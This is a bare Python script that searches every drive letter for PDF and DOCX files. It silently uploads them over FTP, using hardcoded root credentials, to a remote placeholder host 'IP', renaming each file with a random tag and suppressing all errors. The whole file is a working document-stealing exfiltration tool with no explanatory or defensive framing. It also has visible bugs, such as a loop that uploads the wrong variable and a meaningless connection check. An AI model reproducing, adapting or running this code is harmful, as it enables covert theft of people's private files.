import os
import ftplib
import random

def discoverFiles(startpath):
    extensions = [
        'pdf', 'docx', 
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path

a_files = discoverFiles("A:\\")
b_files = discoverFiles("B:\\")
c_files = discoverFiles("C:\\")
d_files = discoverFiles("D:\\")
e_files = discoverFiles("E:\\")
f_files = discoverFiles("F:\\")
g_files = discoverFiles("G:\\")
h_files = discoverFiles("H:\\")
i_files = discoverFiles("I:\\")
j_files = discoverFiles("J:\\")
k_files = discoverFiles("K:\\")
l_files = discoverFiles("L:\\")
m_files = discoverFiles("M:\\")
n_files = discoverFiles("N:\\")
o_files = discoverFiles("O:\\")
p_files = discoverFiles("P:\\")
q_files = discoverFiles("Q:\\")
r_files = discoverFiles("R:\\")
s_files = discoverFiles("S:\\")
t_files = discoverFiles("T:\\")
u_files = discoverFiles("U:\\")
v_files = discoverFiles("V:\\")
w_files = discoverFiles("W:\\")
x_files = discoverFiles("X:\\")
y_files = discoverFiles("Y:\\")
z_files = discoverFiles("Z:\\")




ftp = ftplib.FTP('IP','root','rootadmin')

for i in c_files:
     try:
         Str_2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
         Str_3 = '1234567890'
         rnd = ''.join(random.choice(Str_2+Str_3) for _ in range(5))
         rnd = '[' + rnd + ']'
         fp = open(i, 'rb')
         ftp.storbinary('STOR %s' % os.path.basename(i[0:-4]+rnd+'.pdf'), fp, 1024)
         fp.close()
     except:
         pass

for i in f_files:
    try:
        Str_2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        Str_3 = '1234567890'
        rnd = ''.join(random.choice(Str_2+Str_3) for _ in range(5))
        rnd = '[' + rnd + ']'
        fp = open(i, 'rb')
        ftp.storbinary('STOR %s' % os.path.basename(i[0:-4]+rnd+'.pdf'), fp, 1024)
        fp.close()
    except:
        pass


for i in d_files:
    try:
        Str_2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        Str_3 = '1234567890'
        rnd = ''.join(random.choice(Str_2+Str_3) for _ in range(5))
        rnd = '[' + rnd + ']'
        fp = open(i, 'rb')
        ftp.storbinary('STOR %s' % os.path.basename(i[0:-4]+rnd+'.pdf'), fp, 1024)
        fp.close()
    except:
        pass


for i in g_files:
    try:
        Str_2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        Str_3 = '1234567890'
        rnd = ''.join(random.choice(Str_2+Str_3) for _ in range(5))
        rnd = '[' + rnd + ']'
        fp = open(i, 'rb')
        ftp.storbinary('STOR %s' % os.path.basename(i[0:-4]+rnd+'.pdf'), fp, 1024)
        fp.close()
    except:
        pass


for i in h_files:
    try:
        Str_2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        Str_3 = '1234567890'
        rnd = ''.join(random.choice(Str_2+Str_3) for _ in range(5))
        rnd = '[' + rnd + ']'
        fp = open(i, 'rb')
        ftp.storbinary('STOR %s' % os.path.basename(i[0:-4]+rnd+'.pdf'), fp, 1024)
        fp.close()
    except:
        pass


for i in i_files:
    try:
        Str_2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        Str_3 = '1234567890'
        rnd = ''.join(random.choice(Str_2+Str_3) for _ in range(5))
        rnd = '[' + rnd + ']'
        fp = open(i, 'rb')
        ftp.storbinary('STOR %s' % os.path.basename(i[0:-4]+rnd+'.pdf'), fp, 1024)
        fp.close()
    except:
        pass
for o in o_files:
    try:
        Str_2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        Str_3 = '1234567890'
        rnd= ''.join(random.choice(Str_2+Str_3) for _ in range(5))
        rnd = '[' + rnd + ']'
        fp = open(i, 'rb')
        ftp.storbinary('STOR %s' % os.path.basename(i[0:-4]+rnd+'.pdf'), fp, 1024)
        fp.close()
    except:
        pass
for i in j_files:
    try:
        Str_2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        Str_3 = '1234567890'
        rnd = ''.join(random.choice(Str_2+Str_3) for _ in range(5))
        rnd = '[' + rnd + ']'
        fp = open(i, 'rb')
        ftp.storbinary('STOR %s' % os.path.basename(i[0:-4]+rnd+'.pdf'), fp, 1024)
        fp.close()
    except:
        pass
if ftp==True:
    print('Connected')
else:
    print('faild')


ftp.quit()
